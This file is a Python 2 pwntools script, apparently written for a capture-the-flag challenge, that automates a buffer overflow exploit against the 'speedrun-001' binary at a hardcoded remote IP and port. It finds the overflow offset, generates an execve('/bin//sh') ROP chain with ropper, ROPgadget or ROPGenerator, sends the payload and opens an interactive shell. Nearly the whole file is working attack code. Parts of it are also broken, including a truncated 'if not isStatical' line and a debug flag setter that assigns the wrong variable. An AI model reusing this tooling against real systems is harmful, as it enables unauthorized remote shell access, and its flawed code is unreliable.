from pwn import *
# from ropgenerator import *
from struct import pack
import re, os, sys
from ropper import RopperService

helpmsg = " \n -f Filename\n -core (Use coredumps)\n -vic ip port\n -ibu startbufsize\n -NoDas (No dealarm shell)\n -loc (localonly)\n -fupa fullPath\n -h help\n -gen (ropper(default)/RopGad/ropperService/RopGen)\n -debug (noCore)\n -debugCore (debug with coredump,only local)\n"
binfupa = "/root/PycharmProjects/SaarSec/speedrun-001"  # HowToUse Full Path to file without "./"#
binaryfile = "speedrun-001"  # HowToUse Filename#
remIP = "88.198.108.206"  # HowToUse set remote IP as String#
remPort = 20014  # HowToUse set remote Port as int#
payroll = 1000  # HowToUse Set Buffer Start Size#
binny = "./" + binaryfile
UseCore = False
LocalOnly = False
generator = "ropper"
dealarm = True
debugfinalPayload = False
debugfinalPayloadCore = False
isStatical=True

def preroll(rem):  # HowToUse False for remote True for binary
    if rem:
        tar = process(binny)
    else:
        tar = remote(remIP, remPort)
    # HowToUse Preperation before real BufferOverflow Vuln#
    # ====================================================#
    tar.recvline()
    tar.recvline()
    # ====================================================#
    return tar
    pass


def finder(payroll):
    if UseCore:
        return finderCore(payroll)
    else:
        return finderNoCore(payroll)


def finderCore(payroll):
    global binaryfile, binny
    try:
        os.remove("./core")
    except:
        pass
    tarBufLen = 0
    logBuf = log.progress("Buffer lenght", level=31)
    while (True):
        pr = preroll(False)
        logBuf.status(str(payroll))
        buffer = cyclic(payroll)
        pr.sendline(buffer)
        try:
            context.log_level = "ERROR"
            core = Coredump("./core")
            context.log_level = "WARNING"
        except:
            payroll += 100
            continue
        if p64(core.fault_addr) not in buffer:
            payroll += 100
            continue
        else:
            context.log_level = "ERROR"
            tarBufLen = cyclic_find(p64(core.fault_addr), n=4)
            context.log_level = "WARNING"
            logBuf.success(str(tarBufLen) + " Found!")
            return tarBufLen


def finderNoCore(payroll):
    global binaryfile, binny
    logBuf = log.progress("Buffer lenght", level=31)
    while (True):
        pr = preroll(True)
        logBuf.status(str(payroll))
        buffer = cyclic(payroll)
        pr.sendline(buffer)
        sleep(0.1)
        if pr.poll() == -11:
            logBuf.success(str(payroll + 8) + " Found!")
            return (payroll + 8)  # TODO Fix hardcoded offset thingy
        else:
            pr.kill()
            pr.close()
            payroll += 1


def rolling():
    globals()
    context.binary = binny
    context.log_level = "WARNING"
    logGen = log.progress("Status", level=31)
    logGen.status("Trying to find needed Buffer lenght!")
    tarBufLen = finder(payroll)
    buffer = "A" * (tarBufLen)
    logGen.status("Trying to find a //bin/sh ropchain!")
    context.log_level = "ERROR"
    sleep(0.1)
    shellcode = ropchain()
    sleep(0.1)
    context.log_level = "WARNING"
    logGen.status("RopChain found!")
    shell = open("shell", "w")
    payload = buffer + shellcode
    shell.write(payload)
    shell.close()
    logGen.status("connecting to target server!")
    try:
        rm = preroll(LocalOnly)  # HowToUse True for server False for local
    except:
        logGen.failure("Unable to Connect! Is the Target still up?")
        cont = input("Do you want to run it locally instead? (y/n)")
        if cont == "y":
            rm = preroll(True)
        else:
            exit(0)
    logGen.success("Sending Payload! Here comes the Shell!")
    # HowToUse SnC for normal operation/Debug includes Coredump
    # =========================#
    if debugfinalPayloadCore:
        debugPayload(rm, payload)
    else:
        SnC(rm, payload)
    # =========================#


def SnC(rm, payload):
    if debugfinalPayload:
        context.log_level = "debug"
    rm.sendline(payload)
    sleep(1)
    if dealarm and not LocalOnly:
        dealarm_shell(rm)
    rm.interactive()


def debugPayload(rm, payload):
    context.log_level = "debug"
    os.remove("./core")
    rm.sendline(payload)
    sleep(1)
    if dealarm and not LocalOnly:
        dealarm_shell(rm)
    rm.interactive()
    core = Coredump("./core")
    print core.registers


def getSpacefor(payload):
    globals()
    address=5
    lenPay=len(payload)
    e=ELF(binaryfile)
    rop=ROP(binaryfile)
    rop.call("read",[0,address,lenPay+8])








def ropchain():  # Todo implement more Generators and features
    global generator
    gens = {"ropper": ropchainRopper, "ropperService": ropchainRopperService, "RopGad": ropchainGadget,
            "RopGen": ropchainGenerator}
    funct = gens.get(generator, ropchainRopper)
    return funct()


def ropchainRopper():  # Superfast and working TODO implement more CMDS and ret2libc etc
    ShellCom = "execve"
    command = "ropper -f " + binaryfile + " --chain " + ShellCom + "  > shellcode.txt"
    os.system(command)
    output = open("shellcode.txt", "r")
    #=====================================================# checking for failure
    failmsg="# INSERT SYSCALL GADGET HERE"
    if failmsg in output:
        return ropchainGadget()
    #=====================================================#
    code = output.read().split("# Generated by ropper ropchain generator #\n")[1]
    tes = code.split("\n")
    lentes = len(tes)
    for x in range(lentes):
        tes[x] = tes[x].lstrip()
    res = tes[6:lentes - 2]
    pay = "from struct import pack\n" + tes[4] + "\ndef p(x):\n    return pack('Q',x)\ndef rebase_0(x):\n    " + tes[
        4] + "\n    return pack('Q',x+IMAGE_BASE_0)\n" + \
          "\n".join(res) + "\nROP=open('chain','w')\nROP.write(rop)\nROP.close()"
    pay = escape_ansi(pay)
    # print"======================"
    # print pay
    # print"======================"

    module = open("payloader.py", "w")
    module.write(pay)
    module.close()
    execfile("payloader.py")
    chain = open("chain", "r")
    load = chain.read()
    chain.close()
    # print load
    return load


def ropchainRopperService():  # Todo Implement Ropperservice usage probably for futute features
    options = {'color': False,  # if gadgets are printed, use colored output: default: False
               'badbytes': '',  # bad bytes which should not be in addresses or ropchains; default: ''
               'all': False,  # Show all gadgets, this means to not remove double gadgets; default: False
               'inst_count': 6,  # Number of instructions in a gadget; default: 6
               'type': 'all',  # rop, jop, sys, all; default: all
               'detailed': False}  # if gadgets are printed, use detailed output; default: False
    RopSer = RopperService(options)
    RopSer.options.badbytes = ''
    RopSer.addFile("binary", binaryfile, arch="x86_64")
    RopSer.loadGadgetsFor()
    option = {"address": "0x0000000000400000"}
    print RopSer.createRopChain("execve", "x86_64", option)


def ropchainGadget():  # Not working so good but more often used
    command = "ROPgadget --ropchain --binary " + binaryfile + " > shellcode.txt"
    os.system(command)
    output = open("shellcode.txt", "r")
    code = output.read().split("# execve generated by ROPgadget")[1]
    tes = code.split("\n")
    lentes = len(tes)
    for x in range(lentes):
        tes[x] = tes[x].lstrip()
    res = tes[4:lentes - 2]
    pay = "\n".join(res) + "\nload=p\n"
    pay = escape_ansi(pay)
    # print pay
    exec (pay)
    # print load
    return load


def ropchainGenerator():  # Super slow but working
    global binfupa
    logexp = log.progress("RopGenerator", level=31)
    logexp.status("Loading File from :" + binfupa + " This may take a while")
    rop = process("/root/Downloads/ropgenerator-1.2/ROPGenerator")
    rop.recvuntil(")>")
    rop.sendline("load " + binfupa)
    resp = rop.recvuntil(")>")
    # context.log_level = "debug"
    resp = rop.recvuntil(")>")
    if "Error" in resp:
        logexp.failure("Unable to find file! Check the Full Path!\n" + resp)
        exit(0)
    else:
        logexp.status("File Loaded!")
    rop.sendline("exploit")
    rop.recvuntil(")>")
    logexp.status("Building Payload!")
    rop.recvuntil(")>")
    rop.sendline("syscall -f python -c execve('/bin//sh', 0, 0)")
    resp = rop.recvuntil(")>")
    resp = rop.recvuntil(")>")
    logexp.success("Payload Buildt!")
    print "==================================="
    print resp
    print "==================================="

    tes = resp.split("\n")
    lentes = len(tes)
    for x in range(lentes):
        tes[x] = tes[x].lstrip()
    res = tes[4:lentes - 2]
    pay = "\n".join(res) + "\nload=p\n"
    pay = escape_ansi(pay)
    print pay
    exec (pay)
    return load


def escape_ansi(lin):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', lin)


def p(x):  #
    return pack("<Q", x)


def parser(pycode):  # TODO Parser for ropchain python code
    pass


def parseargs():
    globals()
    arglist = sys.argv
    argn = len(arglist)
    avargs = {"-f": setFilename, "-core": setCore, "-vic": setVictim, "-ibu": setinitBuff,
              "-loc": setLocalOnly, "-fupa": setFullPath, "-h": help, "-gen": setGen, "-NoDas": setNoDealarm,
              "-debug": setDebug, "-debugCore": setDebugCore}
    for x in range(argn):
        arg = arglist[x]
        funct = avargs.get(arg, Pass)
        funct(x)


# -f Filename -core (y/n) -vic ip port -ibu startbufsize -NoDas (No dealarm shell) -loc (localonly) -fupa fullPath -h help -gen (ropper/RopGad/ropperService/RopGen) -debug"

def setDebugCore(x):
    global debugfinalPayloadCore
    debugfinalPayload = True


def setDebug(x):
    global debugfinalPayload
    debugfinalPayload = True


def setNoDealarm(x):
    global dealarm
    dealarm = False


def setGen(x):
    global generator
    generator = sys.argv[x + 1]


def Pass(x): pass


def help(x):
    global helpmsg
    print str(sys.argv[0]) + helpmsg
    exit(0)


def setFilename(x):
    global binaryfile
    binaryfile = sys.argv[x + 1]


def setCore(x):
    global UseCore
    UseCore = True


def setLocalOnly(x):
    global LocalOnly
    LocalOnly = True

def setVictim(x):
    global remIP, remPort
    remIP = sys.argv[x + 1]
    remPort = int(sys.argv[x + 2])


def setinitBuff(x):
    global payroll
    payroll = int(sys.argv[x + 1])


def setFullPath(x):
    global binfupa
    binfupa = sys.argv[x + 1]

def analELF():
    globals()
    e=ELF(binaryfile)
    isStatical=e.statically_linked
    if not isStatical


if __name__ == '__main__':
    parseargs()
    rolling()
